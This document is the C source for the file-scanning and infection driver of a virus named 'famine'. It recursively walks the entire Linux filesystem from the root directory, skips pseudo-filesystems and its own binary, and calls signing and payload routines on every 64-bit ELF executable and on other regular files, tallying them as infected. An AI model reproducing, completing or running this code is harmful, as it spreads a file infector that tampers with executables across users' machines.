#include "famine.h"

#include <dirent.h>
#include <elf.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#ifndef PATH_MAX
# define PATH_MAX 4096
#endif

typedef struct s_scan_stats
{
	uint64_t	scanned_files;
	uint64_t	infected_files;
	uint64_t	skipped_files;
	uint64_t	skipped_dirs;
}               	t_scan_stats;

static t_scan_stats	g_scan_stats;
static char		g_self_path[PATH_MAX];

static int	is_dot_entry(const char *name)
{
	if (name[0] != '.')
		return (0);
	if (name[1] == '\0')
		return (1);
	if (name[1] == '.' && name[2] == '\0')
		return (1);
	return (0);
}

static int	is_supported_elf(t_file file)
{
	Elf64_Ehdr	*ehdr;
	uint64_t	ph_table_size;

	if (file.head == MAP_FAILED || file.size < sizeof(Elf64_Ehdr))
		return (0);
	ehdr = (Elf64_Ehdr *)file.head;
	if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0)
		return (0);
	if (ehdr->e_ident[EI_VERSION] != EV_CURRENT)
		return (0);
	if (ehdr->e_ident[EI_CLASS] != ELFCLASS64)
		return (0);
	if (ehdr->e_machine != EM_X86_64)
		return (0);
	if (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN && ehdr->e_type != ET_REL)
		return (0);
	if (ehdr->e_phoff > file.size || ehdr->e_phentsize != sizeof(Elf64_Phdr))
		return (0);
	ph_table_size = (uint64_t)ehdr->e_phnum * sizeof(Elf64_Phdr);
	if (ph_table_size == 0 || ph_table_size > file.size - ehdr->e_phoff)
		return (0);
	if (last_phdr(file.head) == NULL)
		return (0);
	return (1);
}

static int	is_skipped_dir(const char *path)
{
	const char	*skip[] = {
		"/proc",
		"/sys",
		"/dev",
		"/run",
		"/mnt",
		"/media",
		NULL
	};
	int		i;

	for (i = 0; skip[i] != NULL; ++i)
	{
		size_t	slen;

		slen = strlen(skip[i]);
		if (strncmp(path, skip[i], slen) == 0 && (path[slen] == '/' || path[slen] == '\0'))
			return (1);
	}
	return (0);
}

static int	is_same_path(const char *a, const char *b)
{
	size_t	la;
	size_t	lb;

	if (a == NULL || b == NULL)
		return (0);
	la = strlen(a);
	lb = strlen(b);
	while (la > 1 && a[la - 1] == '/')
		la--;
	while (lb > 1 && b[lb - 1] == '/')
		lb--;
	if (la != lb)
		return (0);
	return (strncmp(a, b, la) == 0);
}

static int	is_forbidden_file(const char *path)
{
	if (is_same_path(path, FAMINE_HELPER_PATH))
		return (1);
	if (g_self_path[0] != '\0' && is_same_path(path, g_self_path))
		return (1);
	return (0);
}

static int	build_path(char *path, size_t size, const char *dirname, const char *name)
{
	int	written;

	if (strcmp(dirname, "/") == 0)
		written = snprintf(path, size, "/%s", name);
	else
		written = snprintf(path, size, "%s/%s", dirname, name);
	if (written < 0 || written >= (int)size)
		return (-1);
	return (0);
}

static void	set_self_path(void)
{
	ssize_t	len;

	len = readlink("/proc/self/exe", g_self_path, sizeof(g_self_path) - 1);
	if (len < 0)
		g_self_path[0] = '\0';
	else
		g_self_path[len] = '\0';
}

static int	process_regular_file(const char *path, struct stat *st)
{
	t_file	target;
	int		is_elf;

	g_scan_stats.scanned_files++;
	target = file_load(path, 0);
	if (target.head == MAP_FAILED)
	{
		g_scan_stats.skipped_files++;
		return (-1);
	}
	if (is_signed(target))
	{
		file_unload(target);
		g_scan_stats.skipped_files++;
		return (0);
	}
	is_elf = is_supported_elf(target);
	file_unload(target);
	target = file_load(path, is_elf ? PAYLOAD_BIN_SIZE : SIGNATURE_SIZE);
	if (target.head == MAP_FAILED)
	{
		g_scan_stats.skipped_files++;
		return (-1);
	}
	if (is_elf)
	{
		if (sign(target) == -1)
		{
			g_scan_stats.skipped_files++;
			return (-1);
		}
	}
	else
	{
		if (sign_blob(target) == -1)
		{
			g_scan_stats.skipped_files++;
			return (-1);
		}
	}
	if (lstat(path, st) < 0)
	{
		g_scan_stats.skipped_files++;
		return (-1);
	}
	g_scan_stats.infected_files++;
	return (0);
}

static void	infect_file(const char *path)
{
	struct stat	st;

	if (is_forbidden_file(path))
		return;
	if (lstat(path, &st) < 0)
		return;
	if (!S_ISREG(st.st_mode))
		return;
	process_regular_file(path, &st);
}

static void	scan_directory(const char *dirname)
{
	DIR				*dir;
	struct dirent	*entry;
	char			path[PATH_MAX];
	struct stat		st;

	if (is_skipped_dir(dirname))
	{
		g_scan_stats.skipped_dirs++;
		return;
	}
	dir = opendir(dirname);
	if (dir == NULL)
		return;
	while ((entry = readdir(dir)) != NULL)
	{
		if (is_dot_entry(entry->d_name))
			continue;
		if (build_path(path, sizeof(path), dirname, entry->d_name) < 0)
			continue;
		if (lstat(path, &st) < 0)
			continue;
		if (S_ISLNK(st.st_mode))
			continue;
		if (S_ISDIR(st.st_mode))
			scan_directory(path);
		else if (S_ISREG(st.st_mode))
			infect_file(path);
	}
	closedir(dir);
}

void	scan_targets(void)
{
	memset(&g_scan_stats, 0, sizeof(g_scan_stats));
	memset(g_self_path, 0, sizeof(g_self_path));
	set_self_path();
	scan_directory("/");
}
